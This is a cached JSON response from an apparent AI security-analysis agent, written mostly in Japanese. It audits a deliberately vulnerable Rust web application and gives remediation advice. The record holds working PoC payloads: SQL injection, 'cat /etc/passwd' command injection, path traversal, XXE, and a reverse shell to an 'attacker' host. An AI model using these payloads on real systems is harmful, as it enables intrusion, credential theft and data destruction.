{
  "version": "1.0.0",
  "agent": "claude-code",
  "model": "claude-code",
  "prompt_hash": "52528d3216d4ecb28840057761dfcaac6bef73281c87954d3130eb82de5e3df3",
  "response": "{\"scratchpad\":\"パターンマッチング対象の reqwest HTTP クライアントライブラリに関する分析。コード内で複数の SSRF 脆弱性が検出されました。/api/ssrf/fetch エンドポイントは完全に未検証の URL をリクエストしており、内部リソースへのアクセスが可能です。さらに、SQL インジェクション、コマンドインジェクション、LFI、IDOR、XXE、安全でないデシリアライゼーションなど、複数の深刻な脆弱性が存在します。各脆弱性について入力値追跡を実施し、最も危険な攻撃パスを特定しました。\",\"analysis\":\"このアプリケーションは意図的に設計された脆弱なテスト用 Rust アプリケーションです。reqwest ライブラリを使用した SSRF エンドポイント (/api/ssrf/fetch) は、完全に未検証の URL パラメータを受け付け、任意のネットワークリソースへのアクセスを可能にします。さらに、複数の層にわたる脆弱性が存在します:\\n\\n1. **SSRF 脆弱性 (T1071, T1105)**: reqwest::get() への未検証 URL パス\\n2. **SQL インジェクション**: ほぼすべてのデータベースクエリで文字列補間による直接的な SQL 構築\\n3. **コマンドインジェクション**: Command::new(\\\"sh\\\") への未検証ユーザー入力\\n4. **ローカルファイル包含 (LFI)**: ファイルパスの検証なしでの fs::read_to_string() 実行\\n5. **IDOR**: ユーザー認証なしでのリソース直接アクセス\\n6. **安全でないデシリアライゼーション**: base64/bincode/YAML/XML の未検証パース\\n7. **パストラバーサル**: ファイルシステム操作での相対パス許容\\n8. **認証バイパス**: 平文パスワード、予測可能なトークン生成\\n9. **情報開示**: ログ出力での認証情報露出\\n\\nこれらの脆弱性は攻撃者による認証回避、任意ファイル読み取り/書き込み、リモートコード実行、内部ネットワークへのアクセスを可能にします。\",\"poc\":\"# SSRF PoC - 内部ネットワークスキャン\\ncurl -X POST http://localhost:8080/api/ssrf/fetch \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"url\\\": \\\"http://localhost:6379/\\\"}'\\n\\n# SQL インジェクション PoC - 認証バイパス\\ncurl 'http://localhost:8080/api/auth/login' \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"username\\\": \\\"admin\\\\' OR \\\\'1\\\\'=\\\\'1\\\", \\\"password\\\": \\\"x\\\"}'\\n\\n# コマンドインジェクション PoC - リモートコード実行\\ncurl 'http://localhost:8080/api/exec/command' \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"command\\\": \\\"whoami; cat /etc/passwd\\\"}'\\n\\n# LFI PoC - 機密ファイル読み取り\\ncurl 'http://localhost:8080/file?name=../../../etc/passwd'\\n\\n# SQL インジェクション PoC (ドキュメント検索)\\ncurl 'http://localhost:8080/api/documents/search?q=%27 UNION SELECT * FROM users -- &user_id=1'\\n\\n# IDOR PoC - 他ユーザー情報アクセス\\ncurl 'http://localhost:8080/api/user/2'\\ncurl 'http://localhost:8080/api/logs/2'\\n\\n# パストラバーサル PoC (ドキュメントコンテンツ取得)\\ncurl 'http://localhost:8080/api/documents/1/content'\\n# Database に保存されている '/etc/passwd' をレスポンス\\n\\n# XXE PoC\\ncurl -X POST http://localhost:8080/api/xml/parse \\\\\\n  -H 'Content-Type: text/plain' \\\\\\n  -d '<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>'\\n\\n# 安全でないデシリアライゼーション PoC\\npython3 -c \\\"import base64, json; import subprocess; payload = base64.b64encode(b'{\\\\\\\"cmd\\\\\\\": \\\\\\\"id\\\\\\\"}').decode(); print(payload)\\\" | xargs -I {} curl -X POST http://localhost:8080/api/deserialize -H 'Content-Type: application/json' -d '{\\\"data\\\": \\\"{}\\\"}'\\n\",\"confidence_score\":100,\"vulnerability_types\":[\"SSRF\",\"SQLI\",\"RCE\",\"LFI\",\"IDOR\",\"XXE\",\"AFO\",\"XSS\"],\"par_analysis\":{\"principals\":[{\"identifier\":\"UrlRequest.url パラメータ\",\"trust_level\":\"untrusted\",\"source_context\":\"HTTP POST リクエストボディから直接取得される /api/ssrf/fetch エンドポイントへの入力\",\"risk_factors\":[\"ユーザー提供の任意の URL 文字列\",\"スキームやホスト検証なし\",\"内部ネットワークアクセス可能性\",\"認証情報漏洩リスク\"]},{\"identifier\":\"CommandRequest.command パラメータ\",\"trust_level\":\"untrusted\",\"source_context\":\"HTTP POST /api/exec/command エンドポイント\",\"risk_factors\":[\"システムコマンド実行の完全な制御を許可\",\"入力値の検証や制限なし\",\"shell (-c) フラグによる任意コマンド実行\"]},{\"identifier\":\"LoginRequest.username/password\",\"trust_level\":\"untrusted\",\"source_context\":\"HTTP POST /api/auth/login エンドポイント\",\"risk_factors\":[\"SQL インジェクションベクトル\",\"認証バイパス可能性\",\"ログへの平文記録\"]},{\"identifier\":\"query パラメータ (複数エンドポイント)\",\"trust_level\":\"untrusted\",\"source_context\":\"GET パラメータ: username, order, hostname, count, name, q, user_id, doc_id, dir\",\"risk_factors\":[\"SQL インジェクション (query, order, user_id, doc_id)\",\"コマンドインジェクション (hostname, count)\",\"パストラバーサル (name, dir)\",\"LFI (dir)\"]},{\"identifier\":\"file upload payload\",\"trust_level\":\"untrusted\",\"source_context\":\"/api/file/upload マルチパートファイルアップロード\",\"risk_factors\":[\"ファイル名の検証なし\",\"/tmp に直接書き込み\",\"パストラバーサル可能性\",\"任意ファイル上書き可能\"]},{\"identifier\":\"DataRequest.data (デシリアライゼーション)\",\"trust_level\":\"untrusted\",\"source_context\":\"/api/deserialize エンドポイント\",\"risk_factors\":[\"base64 エンコード bincode ペイロード\",\"型チェックなし\",\"任意オブジェクト構築可能\"]},{\"identifier\":\"YAML/XML ペイロード\",\"trust_level\":\"untrusted\",\"source_context\":\"/api/yaml/load, /api/xml/parse エンドポイント\",\"risk_factors\":[\"外部エンティティ処理なし\",\"Entity Expansion DoS 可能\",\"ファイルシステムアクセス可能\"]},{\"identifier\":\"LdapRequest.username\",\"trust_level\":\"untrusted\",\"source_context\":\"/api/ldap/search エンドポイント\",\"risk_factors\":[\"LDAP フィルタインジェクション\",\"ワイルドカードフィルタによる認証バイパス\"]}],\"actions\":[{\"identifier\":\"reqwest::get()\",\"security_function\":\"SSRF 検証と許可リスト確認\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"スキーム検証なし (HTTP, HTTPS 限定なし)\",\"ホスト検証なし (localhost, 127.0.0.1, 内部 IP 許可)\",\"ポート検証なし (SSH, データベース, キャッシュ接続可能)\",\"リダイレクト制御なし\",\"タイムアウト設定なし\"],\"bypass_vectors\":[\"localhost:6379 (Redis) にアクセス\",\"192.168.0.0/16 内部ネットワーク走査\",\"メタデータサービス (169.254.169.254) アクセス\",\"file:// プロトコルスキーム (実装による)\",\"ホスト名解析タイミング攻撃\"]},{\"identifier\":\"authenticate_user() - SQL インジェクション\",\"security_function\":\"認証クエリの安全な実行\",\"implementation_quality\":\"bypassed\",\"detected_weaknesses\":[\"format!() による直接的な SQL 構築\",\"bind パラメータ未使用\",\"プレペアドステートメント未使用\",\"平文パスワード比較\",\"エラーメッセージでのユーザー存在確認\"],\"bypass_vectors\":[\"admin' OR '1'='1 (真値判定)\",\"admin' UNION SELECT * FROM users -- (別テーブル抽出)\",\"admin' UNION SELECT * FROM sqlite_master -- (スキーマ情報)\",\"admin'; DROP TABLE users; -- (削除)\",\"タイムベース盲目的 SQL インジェクション\"]},{\"identifier\":\"execute_system_command()\",\"security_function\":\"コマンド実行の制限と検証\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"Command::new(\\\"sh\\\") -c で任意コマンド許可\",\"入力フィルタリングなし\",\"ホワイトリストなし\",\"出力にはサニタイズなし\"],\"bypass_vectors\":[\"whoami; cat /etc/passwd (コマンドチェーン)\",\"$(cat /etc/shadow) (コマンド置換)\",\"`id > /tmp/pwned` (バックティック実行)\",\"ping -c 9999 localhost (DoS)\",\"reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1\"]},{\"identifier\":\"read_file_content()\",\"security_function\":\"ファイル読み取りのパス検証\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"fs::read_to_string() で任意パス許可\",\"パストラバーサル検出なし (../ 許可)\",\"ホワイトリストなし\",\"パーミッションチェックなし (Rust が OS に委譲)\"],\"bypass_vectors\":[\"../../../etc/passwd (相対パストラバーサル)\",\"/etc/shadow (所有者権限で実行中)\",\"../../../../proc/self/environ (環境変数)\",\"/etc/hosts (ネットワーク設定)\",\".aws/credentials (認証情報)\"]},{\"identifier\":\"get_user_by_id() - SQL インジェクション\",\"security_function\":\"ID パラメータの安全な処理\",\"implementation_quality\":\"bypassed\",\"detected_weaknesses\":[\"format!() での直接的な SQL 構築\",\"整数型キャストなし\",\"バリデーションなし\"],\"bypass_vectors\":[\"1 UNION SELECT * FROM sqlite_master (スキーマ抽出)\",\"1; DROP TABLE users; -- (削除)\",\"1 OR 1=1 (全レコード抽出)\"]},{\"identifier\":\"search_documents() - 認可チェック欠如 (IDOR)\",\"security_function\":\"所有者確認と権限検証\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"user_id パラメータを受け取るも使用せず (_user_id)\",\"所有者チェックなし\",\"WHERE owner_id = ? 句なし\",\"全ドキュメント検索可能\"],\"bypass_vectors\":[\"他ユーザーのドキュメント検索可能\",\"機密情報を含むドキュメント閲覧\",\"SQL インジェクションと組み合わせで権限昇格\"]},{\"identifier\":\"get_document_content() - LFI/パストラバーサル\",\"security_function\":\"ファイルパスの検証と制限\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"database の file_path カラムから直接 fs::read_to_string() 実行\",\"/ で始まる絶対パス許可\",\"../../ トラバーサルシーケンス許可\",\"シンボリックリンク追跡\"],\"bypass_vectors\":[\"doc_id=1 で file_path=/etc/passwd 読み取り\",\"doc_id=2 で file_path=../../etc/shadow 読み取り\",\"SQL インジェクションで file_path 直接指定: 1 UNION SELECT '/etc/passwd' as file_path\"]},{\"identifier\":\"log_action() - SQL インジェクション\",\"security_function\":\"監査ログの安全な記録\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"details パラメータの format!() での直接組込\",\"シングルクォートエスケープなし\",\"SQL 予約語チェックなし\"],\"bypass_vectors\":[\"details='INSERT INTO users ... -- でユーザー追加\",\"details='DELETE FROM audit_logs WHERE 1=1' でログ削除\"]},{\"identifier\":\"deserialize_user_preferences()\",\"security_function\":\"安全でないデシリアライゼーション\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"bincode::deserialize() で型チェックなし\",\"base64 デコード後の検証なし\",\"任意の HashMap 構築可能\"],\"bypass_vectors\":[\"RCE トリガーペイロード (Rust 固有の実装依存)\"]},{\"identifier\":\"parse_xml_content()\",\"security_function\":\"XXE 防止\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"EventReader で external entity 処理なし制御\",\"DTD 完全無効化なし\",\"Entity Expansion DoS 対策なし\",\"スキーマ検証なし\"],\"bypass_vectors\":[\"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]> による LFI\",\"<!DOCTYPE lolz [<!ENTITY lol \\\"lol\\\"><!ENTITY lol2 \\\"&lol;&lol;&lol;...\\\"...> による DoS\"]},{\"identifier\":\"parse_yaml_content()\",\"security_function\":\"安全な YAML パース\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"YamlLoader で unsafe 機能有効\",\"Python pickle に相当する Rust コード実行が可能 (yaml-rust)\",\"スキーマ検証なし\"],\"bypass_vectors\":[\"!!python/object/apply: os.system [\\\"whoami\\\"] (YAML デシリアライゼーション RCE)\"]},{\"identifier\":\"upload_file()\",\"security_function\":\"ファイルアップロード検証\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"content_disposition.get_filename() から直接 /tmp/{filename} 構築\",\"パストラバーサル検出なし\",\"ファイル拡張子検証なし\",\"ファイルサイズ制限なし\",\"MIME タイプ検証なし\"],\"bypass_vectors\":[\"filename=\\\"../../../etc/cron.d/pwned\\\" でシステム領域に書き込み\",\"filename=\\\"..%2f..%2f..%2fshell.php\\\" (URL エンコード)\",\"filename=\\\"shell.php;.png\\\" (ダブル拡張子)\"]},{\"identifier\":\"get_file_listing()\",\"security_function\":\"ディレクトリ走査の制限\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"fs::read_dir() で任意ディレクトリ許可\",\"パストラバーサル検出なし\",\"ホワイトリストなし\"],\"bypass_vectors\":[\"dir=/etc でシステム設定ファイル列挙\",\"dir=/root でホームディレクトリ列挙\",\"dir=/ でルート走査\"]},{\"identifier\":\"generate_session_token()\",\"security_function\":\"セッショントークン生成\",\"implementation_quality\":\"insufficient\",\"detected_weaknesses\":[\"username:password を SHA256 で hash (暗号化ではなく)\",\"ソルトなし (rainbow table 攻撃可能)\",\"タイムスタンプなし (予測可能)\",\"同じ認証情報 = 同じトークン\"],\"bypass_vectors\":[\"admin:admin123 のトークンは常に同じ\",\"平文認証情報知悉で他ユーザーのトークン生成\",\"トークン有効期限チェックなし\"]}],\"resources\":[{\"identifier\":\"内部ネットワークリソース\",\"sensitivity_level\":\"critical\",\"operation_type\":\"HTTP リクエスト送信\",\"protection_mechanisms\":[]},{\"identifier\":\"システムコマンド実行\",\"sensitivity_level\":\"critical\",\"operation_type\":\"プロセス生成と実行\",\"protection_mechanisms\":[]},{\"identifier\":\"users テーブル\",\"sensitivity_level\":\"critical\",\"operation_type\":\"SQL クエリ実行\",\"protection_mechanisms\":[\"rusqlite ライブラリ (不正しく使用)\"]},{\"identifier\":\"ファイルシステム (/etc/passwd, /etc/shadow など)\",\"sensitivity_level\":\"critical\",\"operation_type\":\"ファイル読み取り\",\"protection_mechanisms\":[]},{\"identifier\":\"audit_logs テーブル\",\"sensitivity_level\":\"high\",\"operation_type\":\"SQL クエリ実行\",\"protection_mechanisms\":[]},{\"identifier\":\"documents テーブル\",\"sensitivity_level\":\"high\",\"operation_type\":\"SQL クエリ実行\",\"protection_mechanisms\":[]},{\"identifier\":\"/tmp ディレクトリ\",\"sensitivity_level\":\"medium\",\"operation_type\":\"ファイル書き込み\",\"protection_mechanisms\":[]}],\"policy_violations\":[{\"rule_id\":\"SSRF-001\",\"rule_description\":\"内部ネットワークリソースへのアクセス制限\",\"violation_path\":\"UrlRequest.url (untrusted) -> 検証なし -> reqwest::get() (critical resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"RCE-001\",\"rule_description\":\"システムコマンド実行の制限\",\"violation_path\":\"CommandRequest.command (untrusted) -> 検証なし -> Command::new(\\\"sh\\\") (critical resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SQLI-001\",\"rule_description\":\"SQL インジェクション防止 (認証)\",\"violation_path\":\"LoginRequest.username/password (untrusted) -> format!() での直接構築 -> SQL 実行 (critical resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SQLI-002\",\"rule_description\":\"SQL インジェクション防止 (ユーザー検索)\",\"violation_path\":\"user_id query パラメータ (untrusted) -> format!() -> SQL 実行\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SQLI-003\",\"rule_description\":\"SQL インジェクション防止 (ドキュメント検索)\",\"violation_path\":\"q, user_id query パラメータ (untrusted) -> format!() -> SQL 実行\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SQLI-004\",\"rule_description\":\"SQL インジェクション防止 (ドキュメントコンテンツ取得)\",\"violation_path\":\"doc_id (untrusted) -> format!() -> SQL 実行 -> LFI に連鎖\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"LFI-001\",\"rule_description\":\"ローカルファイル包含防止\",\"violation_path\":\"name query パラメータ (untrusted) -> 検証なし -> fs::read_to_string() -> /etc/passwd 読み取り可能\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"LFI-002\",\"rule_description\":\"ドキュメント経由のファイル読み取り防止\",\"violation_path\":\"doc_id (untrusted) -> SQLI -> file_path 抽出 -> fs::read_to_string() -> LFI\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"IDOR-001\",\"rule_description\":\"ユーザーリソースの認可チェック\",\"violation_path\":\"user_id path パラメータ (untrusted) -> 認可なし -> 他ユーザーデータ読み取り\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"IDOR-002\",\"rule_description\":\"ドキュメント検索の認可チェック\",\"violation_path\":\"user_id が使用されない -> 全ドキュメント検索可能\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"IDOR-003\",\"rule_description\":\"監査ログの認可チェック\",\"violation_path\":\"user_id (untrusted) -> 認可なし -> 他ユーザーのログ読み取り\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"XXE-001\",\"rule_description\":\"XML External Entity 防止\",\"violation_path\":\"XML body (untrusted) -> EventReader -> XXE 処理有効 -> ファイル読み取り可能\",\"severity\":\"critical\",\"confidence\":0.9},{\"rule_id\":\"DESER-001\",\"rule_description\":\"安全でないデシリアライゼーション防止\",\"violation_path\":\"data query パラメータ (untrusted) -> base64 decode -> bincode::deserialize() -> RCE 可能性\",\"severity\":\"critical\",\"confidence\":0.8},{\"rule_id\":\"YAML-001\",\"rule_description\":\"YAML デシリアライゼーション防止\",\"violation_path\":\"YAML body (untrusted) -> YamlLoader -> RCE 可能性\",\"severity\":\"critical\",\"confidence\":0.8},{\"rule_id\":\"AFO-001\",\"rule_description\":\"ファイルアップロード検証\",\"violation_path\":\"filename (untrusted) -> パストラバーサル検出なし -> /tmp/{filename} に書き込み\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"AFO-002\",\"rule_description\":\"ディレクトリ列挙防止\",\"violation_path\":\"dir query パラメータ (untrusted) -> パストトラバーサル検出なし -> システムファイル列挙\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"CMDI-001\",\"rule_description\":\"コマンドインジェクション防止\",\"violation_path\":\"hostname, count query パラメータ (untrusted) -> ping/nslookup コマンド構築 -> RCE\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"LDAPI-001\",\"rule_description\":\"LDAP インジェクション防止\",\"violation_path\":\"username (untrusted) -> LDAP フィルタ構築 -> ワイルドカード認証バイパス\",\"severity\":\"high\",\"confidence\":0.9},{\"rule_id\":\"AUTH-001\",\"rule_description\":\"認証情報のログ記録禁止\",\"violation_path\":\"password (untrusted) -> ログ出力される -> 認証情報露出\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"TOKEN-001\",\"rule_description\":\"セッショントークンの予測可能性\",\"violation_path\":\"username:password -> SHA256 -> トークン -> 暗号的強度不足\",\"severity\":\"high\",\"confidence\":1.0}]},\"remediation_guidance\":{\"policy_enforcement\":[{\"component\":\"SSRF 脆弱性 (/api/ssrf/fetch)\",\"required_improvement\":\"URL スキーム、ホスト、ポートの厳密な検証\",\"specific_guidance\":\"許可リスト方式で https のみ許可、内部 IP (127.0.0.1, 192.168.*, 10.*, 172.16.* など) をブロック、メタデータサービス (169.254.169.254) をブロック\",\"priority\":\"critical\"},{\"component\":\"SQL インジェクション (すべてのデータベース操作)\",\"required_improvement\":\"プレペアドステートメントの使用\",\"specific_guidance\":\"format!() を廃止し、rusqlite の ? プレースホルダーと conn.prepare()、execute() を使用。すべてのユーザー入力はバインドパラメータで処理\",\"priority\":\"critical\"},{\"component\":\"コマンドインジェクション (/api/exec/command)\",\"required_improvement\":\"コマンド実行の廃止またはホワイトリスト化\",\"specific_guidance\":\"sh -c の使用を廃止。必要な場合は、実行可能なコマンドをホワイトリストに限定し、Command::new() で各パラメータを個別に指定 (sh -c ではなく)\",\"priority\":\"critical\"},{\"component\":\"ローカルファイル包含 (/file, /api/documents/*/content)\",\"required_improvement\":\"ファイルパスの厳密な検証\",\"specific_guidance\":\"許可されたディレクトリをホワイトリストに定義。Path::canonicalize() でシンボリックリンクを解析し、許可されたベースディレクトリ内に存在することを確認\",\"priority\":\"critical\"},{\"component\":\"IDOR 脆弱性 (/api/user/*, /api/documents/search, /api/logs/*)\",\"required_improvement\":\"認可チェックの実装\",\"specific_guidance\":\"現在の認証ユーザーを確認し、リソースの所有者と一致することを確認。search_documents() の _user_id パラメータを実際に WHERE owner_id = ? で使用\",\"priority\":\"critical\"},{\"component\":\"ファイルアップロード (/api/file/upload)\",\"required_improvement\":\"アップロード検証とサンドボックス化\",\"specific_guidance\":\"ファイル名を生成器で生成 (UUID など)、元のファイル名は除外。許可されたディレクトリのみに保存。ファイルサイズ制限、MIME タイプ検証を実装\",\"priority\":\"critical\"},{\"component\":\"XXE 脆弱性 (/api/xml/parse)\",\"required_improvement\":\"XXE 処理の無効化\",\"specific_guidance\":\"XML パーサーで外部エンティティ処理を明示的に無効化。xml-rs ではなく security-aware なパーサー (例: xml-rs で設定) を使用するか、入力を事前検証\",\"priority\":\"critical\"},{\"component\":\"YAML デシリアライゼーション (/api/yaml/load)\",\"required_improvement\":\"安全なパーサーの使用\",\"specific_guidance\":\"yaml-rust の unsafe 機能を無効化。または serde_yaml など static type checking をサポートするパーサーに変更\",\"priority\":\"critical\"},{\"component\":\"安全でないデシリアライゼーション (/api/deserialize)\",\"required_improvement\":\"型チェックと検証\",\"specific_guidance\":\"bincode を廃止。serde_json など型安全なフォーマットを使用。デコード前に構造体スキーマを検証\",\"priority\":\"critical\"},{\"component\":\"ディレクトリ列挙 (/api/files/list)\",\"required_improvement\":\"ディレクトリアクセスの制限\",\"specific_guidance\":\"許可されたディレクトリをホワイトリストに定義。../、./ による移動を検出・拒否。ユーザーのホームディレクトリなど単一パスのみを許可\",\"priority\":\"critical\"},{\"component\":\"LDAP インジェクション (/api/ldap/search)\",\"required_improvement\":\"LDAP フィルタのエスケープ\",\"specific_guidance\":\"LDAP フィルタ特殊文字 (*, (, ), \\\\, NUL) をエスケープ。または LDAP ライブラリの prepare/bind メソッドを使用\",\"priority\":\"high\"},{\"component\":\"認証情報のログ記録\",\"required_improvement\":\"センシティブデータのログ除外\",\"specific_guidance\":\"password, api_key, token などのフィールドは debug ログに記録しない。ログ出力時にマスキング (***) を適用\",\"priority\":\"high\"},{\"component\":\"セッショントークン生成\",\"required_improvement\":\"暗号的に安全なトークン生成\",\"specific_guidance\":\"ランダムなバイト列を生成 (rand crate など)。SHA256 ではなく、暗号的に安全な乱数生成器を使用。有効期限、ローテーション機構を実装\",\"priority\":\"high\"},{\"component\":\"平文パスワード保存\",\"required_improvement\":\"パスワードハッシング\",\"specific_guidance\":\"bcrypt, scrypt, PBKDF2 など適切なハッシング関数を使用。データベースにはハッシュのみを保存。パスワード検証時は constant-time comparison を使用\",\"priority\":\"high\"},{\"component\":\"エラーメッセージでのユーザー存在確認\",\"required_improvement\":\"汎用エラーメッセージ\",\"specific_guidance\":\"ユーザー存在の有無を区別しない。すべてのケースで \\\"認証失敗\\\" など同じメッセージを返す\",\"priority\":\"medium\"}]},\"file_path\":null,\"pattern_description\":null,\"matched_source_code\":null}",
  "metadata": {
    "created_at": "2025-12-30T17:09:20.204339Z",
    "last_accessed": "2025-12-31T04:01:39.262459Z",
    "access_count": 1,
    "prompt_size": 27472,
    "response_size": 24790
  }
}